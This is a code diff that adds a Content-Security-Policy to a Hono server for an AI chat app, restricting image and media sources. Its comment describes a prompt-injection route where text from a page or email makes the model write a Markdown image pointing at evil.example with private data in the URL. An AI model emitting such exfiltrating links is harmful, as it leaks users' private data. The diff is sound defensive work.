@@ -4,6 +4,7 @@ import { bodyLimit } from "hono/body-limit";
 import { compress } from "hono/compress";
 import { etag } from "hono/etag";
 import { createUIMessageStreamResponse, type UIMessage } from "ai";
+import { ARTIFACT_CDNS } from "../shared/cdns.ts";
 import { adminApi } from "./admin/routes.ts";
 import { connectorsApi, oauthCallback } from "./mcp/routes.ts";
 import { displayName } from "./admin/people.ts";
@@ -33,6 +34,28 @@ import { deleteChat, followReply, startReply, stopReply, whenReplyFinished } fro
  */
 type Env = SignedInEnv;
 const app = new Hono<Env>();
+
+/**
+ * What the app's pages may load. A reply is Markdown, and a Markdown image loads by
+ * itself as soon as the reply shows: text that a page or an email put in front of the
+ * model could make it write ![](https://evil.example/?d=<something private>), and the
+ * browser would send the data out with nobody clicking. So images and media load only
+ * from this server, data and blob URLs, and the CDNs an HTML artifact may use (its frame
+ * is held to this policy too). Scripts, styles and fetch are left as they are.
+ */
+const PAGE_POLICY = [
+	`img-src 'self' data: blob: ${ARTIFACT_CDNS.join(" ")}`,
+	"media-src 'self' data: blob:",
+	"object-src 'none'",
+	"form-action 'self'",
+	"base-uri 'self'",
+].join("; ");
+
+// The API's files set their own policy (/api/files/:id), and JSON needs none.
+app.use("*", async (c, next) => {
+	await next();
+	if (!c.req.path.startsWith("/api/") && !c.res.headers.has("Content-Security-Policy")) c.res.headers.set("Content-Security-Policy", PAGE_POLICY);
+});
 
 // For the uptime checks: the server answers and its database does. 503 otherwise.
 app.get("/health", async (c) => {
